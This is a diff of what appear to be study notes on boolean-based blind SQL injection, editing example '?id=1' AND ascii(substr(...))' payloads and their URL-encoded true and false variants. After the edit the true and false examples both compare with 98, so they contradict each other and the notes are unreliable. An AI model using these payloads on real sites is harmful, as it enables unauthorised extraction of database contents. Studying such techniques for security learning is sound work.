@@ -77,9 +77,10 @@ select ascii(substr(database(),1,1));
 
 2. bool injection
 
-?id=1′ AND ascii(substr((select database()) ,3,3)) = 99 #
+?id=1′ AND ascii(substr((select database()),3,3))=99#
 
-true:: ?id=1%27%20AND%20ascii(substr((select%20database())%20,3,3))%20=%2099%23
+true:: ?id=1%27%20AND%20ascii(substr((select%20database()),3,3))=98%23
+	   ?id=1%27%20AND%20ascii(substr((select%20database()),3,3))=98%23
 
 false: ?id=1%27%20AND%20ascii(substr((select%20database())%20,3,3))%20=%2098%23
 
